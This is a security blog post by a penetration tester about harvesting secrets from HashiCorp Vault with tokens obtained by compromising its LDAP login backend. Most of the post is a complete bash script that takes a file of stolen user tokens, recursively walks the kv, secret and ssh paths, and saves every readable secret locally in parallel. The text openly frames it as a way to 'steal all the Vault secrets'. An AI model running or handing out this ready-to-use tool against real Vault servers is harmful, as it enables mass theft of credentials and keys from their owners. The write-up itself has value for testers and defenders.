---
layout: post
title: "Hacking Hashicorp's Vault Secrets Using Login Enumeration"
author: "Joshua Rogers"
categories: security
---

## Introduction

HashiCorp Vault is a popular tool for managing secrets, where users can store and access secrets programmatically. The software behind the Vault server itself may be secure, but any system is only secure as its weakest link.

In a recent pentest, I was able to fully compromise the authentication server which was used by Vault (LDAP). Although I couldn't compromise the Vault server itself, since I could log into every users' account, I could effectively obtain all the secrets stored there.
Of course, it is no surprise that with users' logins, the secrets they have access to... can be accessed. But Vault does not have functionality to simply download all the secrets that a user has access to, nor does it have a way to list the secrets which a user has access to.
Instead, we must enumerate _all_ secrets, attempting to download them one-by-one.

I made a bash script that recursively traverses each directory in Vault and attempts to download the secrets.

## Overview of the Enumeration Script

1. **Setting up the Script**:
   - The "VAULT_ADDR" variable in the script needs to be updated to match the Vault server's address.
   - A file named "keys" should be created and populated with tokens acquired by logging into users using the Vault CLI (`vault login -method=userpass username=username`)

2. **Script Functions**:
   - The script consists of several functions such as `touch2()`, `list_keys()`, and `enumerate_dirs()`.
   - These functions handle tasks like creating directory structures, listing keys in a given path, and recursively enumerating subdirectories (within Vault).

3. **Execution Flow**:
   - The script sets the required environment variables, including the Vault address, and loops through each of the VAULT_TOKEN values in the "keys" file.
   - Nested loops iterate through different Vault paths (`kv`, `secret`, and `ssh`), listing subdirectories and calling the `enumerate_dirs()` function.
   - The `enumerate_dirs()` function calls the `list_keys()` function, which attempts to download any secrets in a directory.
   - The `enumerate_dirs()` function then calls itself and attempts to traverse further directories (a directory can contain secrets and another directory), which will run `list_keys().
   - This recursive enumeration contains until all directories, secrets, Vault paths, and VAULT_TOKEN values, are traversed.

tl;dr: If you want to steal all the Vault secrets that can be accessed using a Vault token (or multiple), edit the following script's `VAULT_ADDR` value, and fill a file named `keys` with `VAULT_TOKEN` values.


```bash
#!/bin/bash

# Set the Vault address and token
export VAULT_ADDR=https://vault:9200/
export VAULT_FORMAT=json

touch2() {
  mkdir -p "$(dirname "$1")" && touch "$1.data"
}

# Function to list all keys in a path
list_keys() {
  local path=$1

  # Get a list of all the key-value pairs in the path
  keys=$(vault kv list "${path}")

  # Loop through each key-value pair and check if it exists
  for key in $(echo "${keys}" | jq -r '.[]' | grep -Ev "/$"  | sed 's/\/$//'); do
    if YES=$(vault kv get "${path}${key}"  2>/dev/null) ; then
      touch2 "${path}${key}"
      echo "$YES" > "${path}${key}.data"
      echo "${path}${key} exists and is readable."
    fi
  done
}

# Recursive function to enumerate all subdirectories
enumerate_dirs() {
  local dir=$1

  # List all keys in the current directory
  list_keys "${dir}"

  # Recursively enumerate all subdirectories
  subdirs=$(vault kv list "${dir}" | jq -r '.[]' | grep -v '\.$')
  for subdir in ${subdirs}; do
    enumerate_dirs "${dir}${subdir}"
  done
}

export -f list_keys
export -f enumerate_dirs
export -f touch2

# Start the enumeration from the root directory
for k in $(cat keys); do
  export VAULT_TOKEN=$k
  echo Now grabbing vault from $(vault token lookup | grep username | awk -F'"' '{print $4}')
  for j in kv secret ssh; do
    for i in $(vault kv list $j/ | jq -r '.[]' | grep -v '\.$'); do
      echo enumerate_dirs "$j/$i"
    done
  done | parallel --gnu -j20 --delay 0.1 --line-buffer
  unset VAULT_TOKEN
done
```
